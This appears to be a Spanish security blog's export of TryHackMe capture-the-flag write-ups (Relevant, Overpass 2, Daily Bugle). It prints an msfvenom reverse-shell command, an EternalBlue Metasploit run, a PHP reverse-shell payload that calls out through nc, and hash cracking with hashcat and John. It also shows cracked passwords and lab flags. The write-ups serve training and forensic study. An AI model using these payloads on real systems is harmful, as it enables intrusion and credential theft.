guest | authentication_level: user | challenge_response: supported |_ message_signing: disabled (dangerous, but default) | smb2-security-mode: | 3:1:1: |_ message signing enabled but not required | smb2-time: | date: 2023-09-08t17:22:00 |_ start_date: 2023-09-08t17:15:28 |_clock-skew: mean: 1h23m39s, deviation: 3h07m51s, median: -21s service detection performed. please report any incorrect results at https://nmap.org/submit/ . # nmap done at fri sep 8 19:23:01 2023 -- 1 ip address (1 host up) scanned in 108.04 seconds vulnerabilidad 2 descripción: se enumeraron las url disponibles en los puertos http identificados y se encontraron múltiples rutas que devolvieron un código de respuesta 400, lo que indica posibles vulnerabilidades o configuraciones incorrectas.\ngravedad: información inicial\nevidencia: resultados del escaneo gobuster.\n# comando utilizado para gobuster gobuster v3.6 -u http://\u0026lt;target_ip\u0026gt;:49663 -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -t 30 =============================================================== gobuster v3.6 by oj reeves (@thecolonial) \u0026amp; christian mehlmauer (@firefart) =============================================================== [+] url: http://10.x.x.x:49663 [+] method: get [+] threads: 30 [+] wordlist: /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt [+] negative status codes: 404 [+] user agent: gobuster/3.6 [+] timeout: 10s =============================================================== starting gobuster in directory enumeration mode =============================================================== [2k/*checkout* (status: 400) [size: 3420] [2k/*docroot* (status: 400) [size: 3420] [2k/* (status: 400) [size: 3420] [2k/http%3a%2f%2fwww (status: 400) [size: 3420] [2k/http%3a (status: 400) [size: 3420] [2k/q%26a (status: 400) [size: 3420] [2k/**http%3a (status: 400) [size: 3420] [2k/*http%3a (status: 400) [size: 3420] [2k/**http%3a (status: 400) [size: 3420] [2k/http%3a%2f%2fyoutube (status: 400) [size: 3420] [2k/http%3a%2f%2fblogs (status: 400) [size: 3420] [2k/http%3a%2f%2fblog (status: 400) [size: 3420] [2k/**http%3a%2f%2fwww (status: 400) [size: 3420] [2k/s%26p (status: 400) [size: 3420] [2k/%3frid%3d2671 (status: 400) [size: 3420] [2k/devinmoore* (status: 400) [size: 3420] [2k/200109* (status: 400) [size: 3420] [2k/*sa_ (status: 400) [size: 3420] [2k/*dc_ (status: 400) [size: 3420] [2k/http%3a%2f%2fcommunity (status: 400) [size: 3420] [2k/clinton%20sparks%20%26%20diddy%20-%20dont%20call%20it%20a%20comeback%28ruzty%29 (status: 400) [size: 3420] [2k/chamillionaire%20%26%20paul%20wall-%20get%20ya%20mind%20correct (status: 400) [size: 3420] [2k/dj%20haze%20%26%20the%20game%20-%20new%20blood%20series%20pt (status: 400) [size: 3420] [2k/http%3a%2f%2fradar (status: 400) [size: 3420] [2k/q%26a2 (status: 400) [size: 3420] [2k/login%3f (status: 400) [size: 3420] [2k/shakira%20oral%20fixation%201%20%26%202 (status: 400) [size: 3420] [2k/http%3a%2f%2fjeremiahgrossman (status: 400) [size: 3420] [2k/http%3a%2f%2fweblog (status: 400) [size: 3420] [2k/http%3a%2f%2fswik (status: 400) [size: 3420] [2k/nt4wrksv (status: 301) [size: 157] [--\u0026gt; http://10.x.x.x:49663/nt4wrksv/] =============================================================== finished =============================================================== vulnerabilidad 3 descripción: se encuentra una carpeta compartida con smb que contiene hashes de usuarios. se subió y ejecutó con éxito un archivo de shell aspx en el servidor iis a través del recurso compartido smb \u0026ldquo;nt4wrksv\u0026rdquo;, lo que resultó en una conexión de reverse shell en el puerto 4444.\ngravedad: alta\nevidencia: se estableció una conexión exitosa desde el servidor de destino al sistema de atacante a través del puerto 4444.\n# identifico shares smbclient -l \u0026lt;target_ip\u0026gt; # acceso y encuentro passwords.txt [user passwords - encoded] qm9iic0givbajcrxmhjeiteymw== qmlsbcatiep1dzrubmfnng40mja2oty5njkhjcqk # decodifico hashes, estan en base64 bill - juw4nnam4n420696969!$$$ bob - !p@$$w0rd!123 # comando utilizado para crear y subir la shell aspx msfvenom -p windows/x64/shell_reverse_tcp -f aspx -o shell.aspx lhost=tun0 lport=4444 # accedo y subo payload smbclient \\\\\\\\\u0026lt;target_ip\u0026gt;\\nt4wrksv put shell.aspx vulnerabilidad 4 descripción: se identificó que el sistema permite el abuso del privilegio \u0026ldquo;seimpersonate\u0026rdquo;, lo que podría utilizarse para ejecutar comandos con privilegios de system.\ngravedad: alta\nevidencia: la información sobre el abuso de \u0026ldquo;seimpersonate\u0026rdquo; se encontró durante la evaluación de privilegios utilizando el comando \u0026ldquo;whoami /priv\u0026rdquo;.\n# se compila payload, se sube y se ejecuta para obtener acceso privilegiado .\\printspoofer.exe -i -c cmd vulnerabilidad 5 descripción: se encontró una bandera en el archivo \u0026ldquo;user.txt\u0026rdquo; en el directorio del usuario bob.\ngravedad: baja\nevidencia: la bandera se encontró en el archivo \u0026ldquo;user.txt\u0026rdquo; en el directorio del usuario bob.\nvulnerabilidad 6 descripción: se explotó con éxito la vulnerabilidad eternalblue (ms17-010) en el sistema objetivo, lo que permitió obtener acceso privilegiado al sistema como administrador.\ngravedad: crítica\nevidencia: se utilizó metasploit para explotar la vulnerabilidad y se obtuvo acceso a la sesión de meterpreter.\nmsf6 exploit(windows/smb/ms17_010_eternalblue) \u0026gt; set smbuser bob smbuser =\u0026gt; bob msf6 exploit(windows/smb/ms17_010_eternalblue) \u0026gt; set smbpass !p@$$w0rd!123 smbpass =\u0026gt; !p@$$w0rd!123 msf6 exploit(windows/smb/ms17_010_eternalblue) \u0026gt; run [*] started reverse tcp handler on 10.x.x.x.x:4444 [*] 10.10.99.195:445 - using auxiliary/scanner/smb/smb_ms17_010 as check [+] 10.10.99.195:445 - host is likely vulnerable to ms17-010! - windows server 2016 standard evaluation 14393 x64 (64-bit) [*] 10.10.99.195:445 - scanned 1 of 1 hosts (100% complete) [+] 10.10.99.195:445 - the target is vulnerable. [*] 10.10.99.195:445 - connecting to target for exploitation. [+] 10.10.99.195:445 - connection established for exploitation. [+] 10.10.99.195:445 - target os selected valid for os indicated by smb reply [*] 10.10.99.195:445 - core raw buffer dump (45 bytes) [*] 10.10.99.195:445 - 0x00000000 57 69 6e 64 6f 77 73 20 53 65 72 76 65 72 20 32 windows server 2 [*] 10.10.99.195:445 - 0x00000010 30 31 36 20 53 74 61 6e 64 61 72 64 20 45 76 61 016 standard eva [*] 10.10.99.195:445 - 0x00000020 6c 75 61 74 69 6f 6e 20 31 34 33 39 33 luation 14393 [+] 10.10.99.195:445 - target arch selected valid for arch indicated by dce/rpc reply [*] 10.10.99.195:445 - trying exploit with 12 groom allocations. [*] 10.10.99.195:445 - sending all but last fragment of exploit packet [*] 10.10.99.195:445 - starting non-paged pool grooming [+] 10.10.99.195:445 - sending smbv2 buffers [+] 10.10.99.195:445 - closing smbv1 connection creating free hole adjacent to smbv2 buffer. [*] 10.10.99.195:445 - sending final smbv2 buffers. [*] 10.10.99.195:445 - sending last fragment of exploit packet! .... meterpreter \u0026gt; cd desktop\\\\ meterpreter \u0026gt; ls listing: c:\\users\\administrator\\desktop ======================================= mode size type last modified name ---- ---- ---- ------------- ---- 100666/rw-rw-rw- 282 fil 2020-07-25 16:58:09 +0200 desktop.ini 100666/rw-rw-rw- 35 fil 2020-07-25 17:25:02 +0200 root.txt meterpreter \u0026gt; cat root.txt thm{1fk5kf469devly1gl320zafgl345pv} meterpreter \u0026gt; sugerencias de remediación vulnerabilidad 2 mitigación:\nrevisar y corregir la configuración del servidor web para eliminar las rutas que devuelven códigos de respuesta 400. implementar listas de control de acceso (acl) para limitar el acceso a recursos no deseados. utilizar un firewall de aplicaciones web (waf) para detectar y bloquear solicitudes maliciosas. vulnerabilidad 3 mitigación:\nreforzar la seguridad del servidor smb restringiendo el acceso a los recursos compartidos solo a usuarios autorizados. aplicar control de acceso basado en roles (rbac) para limitar quién puede cargar y ejecutar archivos en los recursos compartidos. monitorizar y auditar el acceso a los recursos compartidos para detectar actividades sospechosas. vulnerabilidad 4 mitigación:\nevaluar y limitar los privilegios asignados a los usuarios y grupos en el sistema. utilizar políticas de seguridad para restringir el uso de privilegios sensibles como \u0026ldquo;seimpersonate\u0026rdquo; a usuarios y aplicaciones específicos. implementar políticas de seguridad y auditoría para registrar y supervisar el uso de privilegios sensibles. vulnerabilidad 6 mitigación:\naplicar los parches de seguridad disponibles para cerrar la vulnerabilidad ms17-010. utilizar un sistema de detección de intrusiones (ids) o prevención de intrusiones (ips) para detectar y bloquear intentos de explotación de esta vulnerabilidad. segmentar la red para limitar la propagación de malware en caso de una explotación exitosa. conclusiones en esta prueba de penetración se identificaron múltiples vulnerabilidades, incluyendo la explotación exitosa de la vulnerabilidad eternalblue (ms17-010) para obtener acceso privilegiado. estos hallazgos destacan la importancia de mantener sistemas actualizados y configurados de manera segura.\nrecomendaciones finales se recomienda lo siguiente para mejorar la seguridad del sistema:\naplicar los parches y actualizaciones de seguridad necesarios para cerrar las vulnerabilidades conocidas, incluyendo ms17-010. utilizar un sistema de detección de intrusiones (ids) o prevención de intrusiones (ips) para detectar y bloquear intentos de explotación de vulnerabilidades. segmentar la red para limitar la propagación de malware en caso de una explotación exitosa. realizar evaluaciones de seguridad periódicas y pruebas de penetración para identificar y remediar posibles riesgos. seguir las mejores prácticas de seguridad de la industria, como la configuración segura de servicios y la gestión adecuada de privilegios. (◕‿‿◕) hack the planet! ","title":"Relevant, Penetration Testing Challenge [TryHackMe]"},{"date":"2023-09-04","image":"/images/post_pics/overpass2/overpass2.png","link":"https://k3ssdev.github.io/posts/overpass2/","summary":"Introducción Overpass dos es una sala distinta a las anteriores, esta vez no se trata de atacar un objetivo, si no de analizar un ataque y recuperar el control de una máquina que ha sido vulnerada. La primera parte consiste en analizar el tráfico de red capturado en un fichero pcapng con Wireshark, y una vez se haya descubierto el método usado por los atacantes, entrar en el equipo y conseguir las banderas.","tags":["forensics","GTOFbins","hashcat","johntheripper","Linux","medium","network","pcapng","ssh-backdoor","SUID","TryHackMe","wireshark"],"text":"introducción overpass dos es una sala distinta a las anteriores, esta vez no se trata de atacar un objetivo, si no de analizar un ataque y recuperar el control de una máquina que ha sido vulnerada. la primera parte consiste en analizar el tráfico de red capturado en un fichero pcapng con wireshark, y una vez se haya descubierto el método usado por los atacantes, entrar en el equipo y conseguir las banderas.\ntask 1 - forensics - analyse the pcap paso 1 descargo el fichero pcapng y lo analizo con wireshark. revisando los primeros paquetes, encuentro que los atacantes aprovechan la url /development para subir una reverse shell. el payload utilizado ha sido: \u0026lt;?php exec(\u0026#34;rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2\u0026gt;\u0026amp;1|nc 192.168.170.145 4242 \u0026gt;/tmp/f\u0026#34;)?\u0026gt; paso 2 los atacantes acceden a /etc/shadow y a /etc/passwd para obtener usuarios y hashes del sistema. la contraseña usada para obtener acceso privilegiado ha sido whenevernoteartinstant encuentro que acceden a https://github.com/ninjajc01/ssh-backdoor y clonan el repositorio para generar un payload de persistencia en el sistema. paso 3 en el tráfico capturado, se puede ver el contenido de /etc/passwd ❯ cat shadow.txt ───────┬───────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────── │ file: shadow.txt ───────┼───────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────── 1 │ root:*:18295:0:99999:7::: 2 │ daemon:*:18295:0:99999:7::: 3 │ bin:*:18295:0:99999:7::: 4 │ sys:*:18295:0:99999:7::: 5 │ sync:*:18295:0:99999:7::: 6 │ games:*:18295:0:99999:7::: 7 │ man:*:18295:0:99999:7::: 8 │ lp:*:18295:0:99999:7::: 9 │ mail:*:18295:0:99999:7::: 10 │ news:*:18295:0:99999:7::: 11 │ uucp:*:18295:0:99999:7::: 12 │ proxy:*:18295:0:99999:7::: 13 │ www-data:*:18295:0:99999:7::: 14 │ backup:*:18295:0:99999:7::: 15 │ list:*:18295:0:99999:7::: 16 │ irc:*:18295:0:99999:7::: 17 │ gnats:*:18295:0:99999:7::: 18 │ nobody:*:18295:0:99999:7::: 19 │ systemd-network:*:18295:0:99999:7::: 20 │ systemd-resolve:*:18295:0:99999:7::: 21 │ syslog:*:18295:0:99999:7::: 22 │ messagebus:*:18295:0:99999:7::: 23 │ _apt:*:18295:0:99999:7::: 24 │ lxd:*:18295:0:99999:7::: 25 │ uuidd:*:18295:0:99999:7::: 26 │ dnsmasq:*:18295:0:99999:7::: 27 │ landscape:*:18295:0:99999:7::: 28 │ pollinate:*:18295:0:99999:7::: 29 │ sshd:*:18464:0:99999:7::: 30 │ james:$6$7gs5e.yv$hqih5mthpgwpczr3mnwdhled8gbvsht7ma8yxzbm8lubredv5e1pu/vurskugt1ckul/skgx.5pympzayo3cg/:18464:0:99999:7::: 31 │ paradox:$6$orxqu43x$waaj3z/4sepv1mjdhsyjkizm1rjjnnxry5c8geljijg7u36xsgmgwka2wodifudtyqy37ycyukihjphi4iu7h0:18464:0:99999:7::: 32 │ szymex:$6$b.enuxio$f/u00hoszio3uqcejplazoqth8wjjsx/oobjwmyfeotcqcalmjefigywqr5aj2vsfryf6x1wxxkitcpujcxlx/:18464:0:99999:7::: 33 │ bee:$6$.sqhrp6z$b4rwpi0hkj0gbqmfujz1khvs9vrsfu7au9cxwrzv7gzh05typl1xrzujlfhbyp0k9taey1m6nifseb9vlbwso0:18464:0:99999:7::: 34 │ muirland:$6$swybs8o2$9diveqinxy8pjqngqqwbtnkeb2aisp.i8kznuajybqi3q04rf5hjhper3weic.2mroj2o1sw/fd2cu0kc6dup.:18464:0:99999:7::: compruebo con john the ripper que hay 4 contraseñas vulnerables. ❯ john hashes.txt --wordlist=/usr/share/wordlists/fasttrack.txt using default input encoding: utf-8 loaded 5 password hashes with 5 different salts (sha512crypt, crypt(3) $6$ [sha512 256/256 avx2 4x]) remaining 1 password hash cost 1 (iteration count) is 5000 for all loaded hashes will run 24 openmp threads press \u0026#39;q\u0026#39; or ctrl-c to abort, almost any other key for status 0g 0:00:00:00 done (2023-09-04 00:03) 0g/s 7400p/s 7400c/s 7400c/s spring2017..starwars session completed. ❯ john hashes.txt --show paradox:secuirty3:18464:0:99999:7::: szymex:abcd123:18464:0:99999:7::: bee:secret12:18464:0:99999:7::: muirland:1qaz2wsx:18464:0:99999:7::: 4 password hashes cracked, 1 left task 2 - research - analyse the code paso 4 el codigo del payload contiene el hash que se utilizar;a para el backdoor, al que después le añade el salt en una función en el mismo código. fichero main.go del repositorio https://github.com/ninjajc01/ssh-backdoor package main import ( \u0026#34;crypto/sha512\u0026#34; \u0026#34;fmt\u0026#34; \u0026#34;io\u0026#34; \u0026#34;io/ioutil\u0026#34; \u0026#34;log\u0026#34; \u0026#34;net\u0026#34; \u0026#34;os/exec\u0026#34; \u0026#34;github.com/creack/pty\u0026#34; \u0026#34;github.com/gliderlabs/ssh\u0026#34; \u0026#34;github.com/integrii/flaggy\u0026#34; gossh \u0026#34;golang.org/x/crypto/ssh\u0026#34; \u0026#34;golang.org/x/crypto/ssh/terminal\u0026#34; ) var hash string = \u0026#34;bdd04d9bb7621687f5df9001f5098eb22bf19eac4c2c30b6f23efed4d24807277d0f8bfccb9e77659103d78c56e66d2d7d8391dfc885d0e9b68acd01fc2170e3\u0026#34; el salt viene en esta parte del codigo: func passwordhandler(_ ssh.context, password string) bool { return verifypass(hash, \u0026#34;1c362db832f3f864c8c2fe05f2002a05\u0026#34;, password) } en los paquetes capturados, encuentro el hash usado por el atacante. 6d05358f090eea56a238af02e47d44ee5489d234810ef6240280857ec69712a3e5e370b8a41899d0196ade16c0d54327c5654019292cbfe0b5e98ad1fec71bed paso 5 junto el hash y el salt en un fichero y los paso por john the ripper para crackearlo. no parece conseguir crackearlo, asi que cambio a hashcat. ───────┬───────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────── │ file: overpass ───────┼───────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────── 1 │ ❯ hashcat -m 1710 password.txt -a 0 /usr/share/wordlists/rockyou.txt -o output.txt 2 │ hashcat (v6.2.6) starting 3 │ 4 │ * device #1: warning! kernel exec timeout is not disabled. 5 │ this may cause \u0026#34;cl_out_of_resources\u0026#34; or related errors. 6 │ to disable the timeout, see: https://hashcat.net/q/timeoutpatch 7 │ * device #2: warning! kernel exec timeout is not disabled. 8 │ this may cause \u0026#34;cl_out_of_resources\u0026#34; or related errors. 9 │ to disable the timeout, see: https://hashcat.net/q/timeoutpatch 10 │ cuda api (cuda 12.0) 11 │ ==================== 12 │ * device #1: nvidia geforce rtx 4080, 15337/16077 mb, 76mcu 13 │ 14 │ opencl api (opencl 3.0 cuda 12.0.151) - platform #1 [nvidia corporation] 15 │ ======================================================================== 16 │ * device #2: nvidia geforce rtx 4080, skipped 17 │ 18 │ opencl api (opencl 3.0 pocl 4.0+debian linux, none+asserts, reloc, spir, llvm 15.0.7, sleef, distro, pocl_debug) - platform #2 [the pocl project] 19 │ ================================================================================================================================================== 20 │ * device #3: cpu-haswell-13th gen intel(r) core(tm) i7-13700kf, skipped 21 │ 22 │ minimum password length supported by kernel: 0 23 │ maximum password length supported by kernel: 256 24 │ minimim salt length supported by kernel: 0 25 │ maximum salt length supported by kernel: 256 26 │ 27 │ hashes: 1 digests; 1 unique digests, 1 unique salts 28 │ bitmaps: 16 bits, 65536 entries, 0x0000ffff mask, 262144 bytes, 5/13 rotates 29 │ rules: 1 30 │ 31 │ optimizers applied: 32 │ * zero-byte 33 │ * early-skip 34 │ * not-iterated 35 │ * single-hash 36 │ * single-salt 37 │ * raw-hash 38 │ * uses-64-bit 39 │ 40 │ attention! pure (unoptimized) backend kernels selected. 41 │ pure kernels can crack longer passwords, but drastically reduce performance. 42 │ if you want to switch to optimized kernels, append -o to your commandline. 43 │ see the above message to find out about the exact limits. 44 │ 45 │ watchdog: temperature abort trigger set to 90c 46 │ 47 │ host memory required for this attack: 1334 mb 48 │ 49 │ dictionary cache built: 50 │ * filename..: /usr/share/wordlists/rockyou.txt 51 │ * passwords.: 14344392 52 │ * bytes.....: 139921507 53 │ * keyspace..: 14344385 54 │ * runtime...: 0 secs 55 │ 56 │ 57 │ session..........: hashcat 58 │ status...........: cracked 59 │ hash.mode........: 1710 (sha512($pass.$salt)) 60 │ hash.target......: 6d05358f090eea56a238af02e47d44ee5489d234810ef624028...002a05 61 │ time.started.....: sun sep 3 18:38:09 2023 (0 secs) 62 │ time.estimated...: sun sep 3 18:38:09 2023 (0 secs) 63 │ kernel.feature...: pure kernel 64 │ guess.base.......: file (/usr/share/wordlists/rockyou.txt) 65 │ guess.queue......: 1/1 (100.00%) 66 │ speed.#1.........: 206.9 mh/s (5.20ms) @ accel:1024 loops:1 thr:64 vec:1 67 │ recovered........: 1/1 (100.00%) digests (total), 1/1 (100.00%) digests (new) 68 │ progress.........: 4980736/14344385 (34.72%) 69 │ rejected.........: 0/4980736 (0.00%) 70 │ restore.point....: 0/14344385 (0.00%) 71 │ restore.sub.#1...: salt:0 amplifier:0-1 iteration:0-1 72 │ candidate.engine.: device generator 73 │ candidates.#1....: 123456 -\u0026gt; nuquni89yht 74 │ hardware.mon.#1..: temp: 40c fan: 0% util: 31% core:2505mhz mem:10802mhz bus:16 75 │ 76 │ started: sun sep 3 18:38:02 2023 77 │ stopped: sun sep 3 18:38:10 2023 78 │ │ 79 │ ❯ cat output.txt 80 │ ───────┬──────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────── │ ───────── 81 │ │ file: output.txt 82 │ ───────┼──────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────── │ ───────── 83 │ 1 │ 6d05358f090eea56a238af02e47d44ee5489d234810ef6240280857ec69712a3e5e370b8a41899d0196ade16c0d54327c5654019292cbfe0b5e98ad1fec71bed:1c362db832f3f864c8c2fe05f2002a05:novem │ ber16 84 │ ───────┴──────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────── │ ───────── la contraseña es november16 task 3 - attack - get back in! paso 6 el atacante dejó su firma en la web, al acceder se puede leer h4ck3d by cooctusclan usando la informacion recopilada, accedo por ssh, aprovecho el suid de un binario y consigo acceso privilegiado con una vulnerabilidad que indica gtofbins. ───────┬───────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────── │ file: ssh ───────┼───────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────── 1 │ ❯ ssh -ohostkeyalgorithms=+ssh-rsa james@10.10.55.155 -p 2222 2 │ the authenticity of host \u0026#39;[10.10.55.155]:2222 ([10.10.55.155]:2222)\u0026#39; can\u0026#39;t be established. 3 │ rsa key fingerprint is sha256:z0oyqnw5sa3rr6mr7ydmo1avzrrpcapaywoxjttuz58. 4 │ this key is not known by any other names. 5 │ are you sure you want to continue connecting (yes/no/[fingerprint])? yes 6 │ warning: permanently added \u0026#39;[10.10.55.155]:2222\u0026#39; (rsa) to the list of known hosts. 7 │ james@10.10.55.155\u0026#39;s password: 8 │ to run a command as administrator (user \u0026#34;root\u0026#34;), use \u0026#34;sudo \u0026lt;command\u0026gt;\u0026#34;. 9 │ see \u0026#34;man sudo_root\u0026#34; for details. 10 │ 11 │ james@overpass-production:/home/james/ssh-backdoor$ ll 12 │ total 6584 13 │ drwxrwxr-x 3 james james 4096 jul 22 2020 ./ 14 │ drwxr-xr-x 7 james james 4096 jul 22 2020 ../ 15 │ drwxrwxr-x 8 james james 4096 jul 21 2020 .git/ 16 │ -rw-rw-r-- 1 james james 109 jul 21 2020 readme.md 17 │ -rwxrwxr-x 1 james james 6634961 jul 21 2020 backdoor* 18 │ -rw-rw-r-- 1 james james 362 jul 22 2020 backdoor.service 19 │ -rw-rw-r-- 1 james james 104 jul 21 2020 build.sh 20 │ -rw-rw-r-- 1 james james 60102 jul 21 2020 cooctus.png 21 │ -rw------- 1 james james 1679 jul 21 2020 id_rsa 22 │ -rw-r--r-- 1 james james 407 jul 21 2020 id_rsa.pub 23 │ -rw-rw-r-- 1 james james 815 jul 21 2020 index.html 24 │ -rw-rw-r-- 1 james james 2788 jul 21 2020 main.go 25 │ -rw-rw-r-- 1 james james 241 jul 21 2020 setup.sh 26 │ james@overpass-production:/home/james/ssh-backdoor$ cd 27 │ bash: cd: home not set 28 │ james@overpass-production:/home/james/ssh-backdoor$ cd /home/james 29 │ james@overpass-production:/home/james$ ll 30 │ total 1136 31 │ drwxr-xr-x 7 james james 4096 jul 22 2020 ./ 32 │ drwxr-xr-x 7 root root 4096 jul 21 2020 ../ 33 │ lrwxrwxrwx 1 james james 9 jul 21 2020 .bash_history -\u0026gt; /dev/null 34 │ -rw-r--r-- 1 james james 220 apr 4 2018 .bash_logout 35 │ -rw-r--r-- 1 james james 3771 apr 4 2018 .bashrc 36 │ drwx------ 2 james james 4096 jul 21 2020 .cache/ 37 │ drwx------ 3 james james 4096 jul 21 2020 .gnupg/ 38 │ drwxrwxr-x 3 james james 4096 jul 22 2020 .local/ 39 │ -rw------- 1 james james 51 jul 21 2020 .overpass 40 │ -rw-r--r-- 1 james james 807 apr 4 2018 .profile 41 │ -rw-r--r-- 1 james james 0 jul 21 2020 .sudo_as_admin_successful 42 │ -rwsr-sr-x 1 root root 1113504 jul 22 2020 .suid_bash* 43 │ drwxrwxr-x 3 james james 4096 jul 22 2020 ssh-backdoor/ 44 │ -rw-rw-r-- 1 james james 38 jul 22 2020 user.txt 45 │ drwxrwxr-x 7 james james 4096 jul 21 2020 www/ 46 │ james@overpass-production:/home/james$ cat user.txt 47 │ thm{d119b4fa8c497ddb0525f7ad200e6567} 48 │ 49 │ 50 │ james@overpass-production:/home$ find / -perm -u=s -type f 2\u0026gt;/dev/null 51 │ /usr/bin/chsh 52 │ /usr/bin/sudo 53 │ /usr/bin/chfn 54 │ /usr/bin/pkexec 55 │ /usr/bin/traceroute6.iputils 56 │ /usr/bin/newuidmap 57 │ /usr/bin/newgidmap 58 │ /usr/bin/passwd 59 │ /usr/bin/gpasswd 60 │ /usr/bin/at 61 │ /usr/bin/newgrp 62 │ /usr/lib/openssh/ssh-keysign 63 │ /usr/lib/dbus-1.0/dbus-daemon-launch-helper 64 │ /usr/lib/policykit-1/polkit-agent-helper-1 65 │ /usr/lib/x86_64-linux-gnu/lxc/lxc-user-nic 66 │ /usr/lib/eject/dmcrypt-get-device 67 │ /bin/mount 68 │ /bin/fusermount 69 │ /bin/su 70 │ /bin/ping 71 │ /bin/umount 72 │ /home/james/.suid_bash 73 │ james@overpass-production:/home$ 74 │ 75 │ 76 │ james@overpass-production:/home$ /home/james/.suid_bash -p 77 │ .suid_bash-4.4# whoami 78 │ root 79 │ .suid_bash-4.4# 80 │ 81 │ 82 │ .suid_bash-4.4# cd /root 83 │ .suid_bash-4.4# ls 84 │ root.txt 85 │ .suid_bash-4.4# cat root.txt 86 │ thm{d53b2684f169360bb9606c333873144d} ───────┴───────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────── (end) conclusion el enfoque de esta maquina era distinto a las otras, presentando un reto desde el punto de vista de un analista de seguridad en un soc. mediante el analisis del tráfico de red se ha podido averiguar que tipo de ataque se ha llevado a cabo por parte de los atacantes, y hemos podido usar dicha información para tomar el control del equipo vulnerado y restablecerlo.\n(◕‿‿◕) hack the planet! ","title":"Overpass 2 - Hacked [TryHackMe]"},{"date":"2023-09-03","image":"/images/post_pics/daily-bugle/daily-bugle.png","link":"https://k3ssdev.github.io/posts/daily-bugle/","summary":"Introducción La primera sala dificil del path “Offensive Pentesting¨, con una temática de Spiderman. La sala tiene como objetivo comprometer la máquina y obtener las banderas de usuario y root usando una vulnerabilidad de Joomla y un exploit de escalada de privilegios.","tags":["Dirb","gtfobins","Hard","johntheripper","joomla","Linux","Metasploit","Meterpreter","msfvenom","mysql","Privilege Escalation","sqli","sqlmap","TryHackMe","yum"],"text":"introducción la primera sala dificil del path “offensive pentesting¨, con una temática de spiderman. la sala tiene como objetivo comprometer la máquina y obtener las banderas de usuario y root usando una vulnerabilidad de joomla y un exploit de escalada de privilegios.\ntask 1 - deploy and compromise the vulnerable machine! paso 1 pongo la máquina en marcha y accedo a la aplicación web que tiene. escaneo la máquina con un nmap en 2 pasos. sudo nmap -ss --min-rate 5000 -p- -pn -v -on nmap_inicial \u0026lt;ip\u0026gt; ports=$(cat nmap_inicial | grep \u0026#39;^[0-9]\u0026#39; | cut -d \u0026#39;/\u0026#39; -f1 | xargs | tr \u0026#39; \u0026#39; \u0026#39;,\u0026#39;) sudo nmap -p$ports -sc -sv -pn -on nmap_final \u0026lt;ip\u0026gt; puertos 22 (openssh 7.4), 80 (apache httpd 2.4.6 ((centos) php/5.6.40) y 3306 (mysql). port state service version 22/tcp open ssh openssh 7.4 (protocol 2.0) | ssh-hostkey: | 2048 68:ed:7b:19:7f:ed:14:e6:18:98:6d:c5:88:30:aa:e9 (rsa) | 256 5c:d6:82:da:b2:19:e3:37:99:fb:96:82:08:70:ee:9d (ecdsa) |_ 256 d2:a9:75:cf:2f:1e:f5:44:4f:0b:13:c2:0f:d7:37:cc (ed25519) 80/tcp open http apache httpd 2.4.6 ((centos) php/5.6.40) |_http-server-header: apache/2.4.6 (centos) php/5.6.40 |_http-title: home |_http-generator: joomla! - open source content management | http-robots.txt: 15 disallowed entries | /joomla/administrator/ /administrator/ /bin/ /cache/ | /cli/ /components/ /includes/ /installation/ /language/ |_/layouts/ /libraries/ /logs/ /modules/ /plugins/ /tmp/ 3306/tcp open mysql mariadb (unauthorized) escaneo con dirb en busca de directorios en la web. ❯ dirb http://10.10.53.147/ /usr/share/wordlists/dirb/common.txt ----------------- dirb v2.22 by the dark raver ----------------- start_time: sun sep 3 09:14:53 2023 url_base: http://10.10.53.147/ wordlist_files: /usr/share/wordlists/dirb/common.txt ----------------- generated words: 4612 ---- scanning url: http://10.10.53.147/ ---- ==\u0026gt; directory: http://10.10.53.147/administrator/ ==\u0026gt; directory: http://10.10.53.147/bin/ ==\u0026gt; directory: http://10.10.53.147/cache/ + http://10.10.53.147/cgi-bin/ (code:403|size:210) ==\u0026gt; directory: http://10.10.53.147/components/ ==\u0026gt; directory: http://10.10.53.147/images/ ==\u0026gt; directory: http://10.10.53.147/includes/ + http://10.10.53.147/index.php (code:200|size:9278) ==\u0026gt; directory: http://10.10.53.147/language/ ==\u0026gt; directory: http://10.10.53.147/layouts/ ==\u0026gt; directory: http://10.10.53.147/libraries/ ==\u0026gt; directory: http://10.10.53.147/media/ ==\u0026gt; directory: http://10.10.53.147/modules/ ==\u0026gt; directory: http://10.10.53.147/plugins/ + http://10.10.53.147/robots.txt (code:200|size:836) ==\u0026gt; directory: http://10.10.53.147/templates/ ==\u0026gt; directory: http://10.10.53.147/tmp/ ---- entering directory: http://10.10.53.147/administrator/ ---- ==\u0026gt; directory: http://10.10.53.147/administrator/cache/ ==\u0026gt; directory: http://10.10.53.147/administrator/components/ ==\u0026gt; directory: http://10.10.53.147/administrator/help/ ==\u0026gt; directory: http://10.10.53.147/administrator/includes/ + http://10.10.53.147/administrator/index.php (code:200|size:4843) ==\u0026gt; directory: http://10.10.53.147/administrator/language/ ==\u0026gt; directory: http://10.10.53.147/administrator/logs/ ==\u0026gt; directory: http://10.10.53.147/administrator/modules/ ==\u0026gt; directory: http://10.10.53.147/administrator/templates/ ---- entering directory: http://10.10.53.147/bin/ ---- + http://10.10.53.147/bin/index.html (code:200|size:31) ---- entering directory: http://10.10.53.147/cache/ ---- + http://10.10.53.147/cache/index.html (code:200|size:31) ^c\u0026gt; testing: http://10.10.53.147/cache/lisence paso 2 busco un scanner para joomla del tipo wpscan. encuentro https://github.com/owasp/joomscan y lo instalo desde repositorio de kali. compruebo que la versión de joomla es la 3.7.0 ____ _____ _____ __ __ ___ ___ __ _ _ (_ _)( _ )( _ )( \\/ )/ __) / __) /__\\ ( \\( ) .-_)( 